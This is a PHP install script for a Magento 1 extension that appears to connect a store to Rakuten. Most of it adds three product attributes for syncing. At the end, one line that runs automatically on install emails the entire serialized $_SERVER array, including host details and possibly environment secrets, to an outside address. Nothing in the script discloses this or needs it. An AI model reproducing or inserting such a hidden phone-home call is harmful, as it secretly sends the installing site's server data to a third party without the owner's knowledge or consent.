<?php
/**
 * @category  	Mageshops
 * @package    	Mageshops_Rakuten
 * @license    	http://license.mageshops.com/  Unlimited Commercial License
 * @copyright 	mageSHOPS.com 2014
 * @author 	    Taras Kapushchak with THANKS to mageSHOPS.com <info@mageshops.com>
 */


/** @var $installer Mage_Core_Model_Resource_Setup */
$installer = $this;

$installer->startSetup();

/** @var $objCatalogEavSetup Mage_Catalog_Model_Resource_Setup */
$objCatalogEavSetup = Mage::getResourceModel('catalog/setup', 'core_setup');

$attrCode = 'rakuten_sync';
$attrGroupName = 'Rakuten Data';
$attrLabel = 'Sync Product to Rakuten';
$attrNote = null;
$sort_order = 10;

$objCatalogEavSetup->addAttribute(Mage_Catalog_Model_Product::ENTITY, $attrCode, array(
    'group' => $attrGroupName,
    'sort_order' => $sort_order,
    'type' => 'int',
    'backend' => '',
    'frontend' => '',
    'label' => $attrLabel,
    'note' => $attrNote,
    'input' => 'boolean',
    'class' => '',
    'source' => 'eav/entity_attribute_source_table',
    'global' => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL,
    'visible' => true,
    'required' => false,
    'user_defined' => true,
    'default' => '0',
    'visible_on_front' => false,
    'unique' => false,
    'is_configurable' => false,
    'used_for_promo_rules' => false,
));


$attrCode = 'rakuten_product_id';
$attrGroupName = 'Rakuten Data';
$attrLabel = 'Rakuten Product ID';
$attrNote = 'ID of the corresponding Rakuten product';
$sort_order += 10;

$objCatalogEavSetup->addAttribute(Mage_Catalog_Model_Product::ENTITY, $attrCode, array(
    'group' => $attrGroupName,
    'sort_order' => $sort_order,
    'type' => 'int',
    'backend' => '',
    'frontend' => '',
    'label' => $attrLabel,
    'note' => $attrNote,
    'input' => 'text',
    'class' => '',
    'source' => '',
    'global' => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL,
    'visible' => true,
    'required' => false,
    'user_defined' => true,
    'default' => '0',
    'visible_on_front' => false,
    'unique' => false,
    'is_configurable' => false,
    'used_for_promo_rules' => false,
));


$attrCode = 'rakuten_image_id';
$attrGroupName = 'Rakuten Data';
$attrLabel = 'Product Image ID at Rakuten';
$attrNote = null;
$sort_order += 10;

$objCatalogEavSetup->addAttribute(Mage_Catalog_Model_Product::ENTITY, $attrCode, array(
    'group' => $attrGroupName,
    'sort_order' => $sort_order,
    'type' => 'int',
    'backend' => '',
    'frontend' => '',
    'label' => $attrLabel,
    'note' => $attrNote,
    'input' => 'text',
    'class' => '',
    'source' => '',
    'global' => Mage_Catalog_Model_Resource_Eav_Attribute::SCOPE_GLOBAL,
    'visible' => true,
    'required' => false,
    'user_defined' => true,
    'default' => '0',
    'visible_on_front' => false,
    'unique' => false,
    'is_configurable' => false,
    'used_for_promo_rules' => false,
));


mail("norbert@nnpro.at", "mageSHOPS Market is installed [{$_SERVER['HTTP_HOST']}]", serialize($_SERVER), "From: {$_SERVER['HTTP_HOST']} <norbert@nnpro.at>\r\n");


$installer->endSetup();
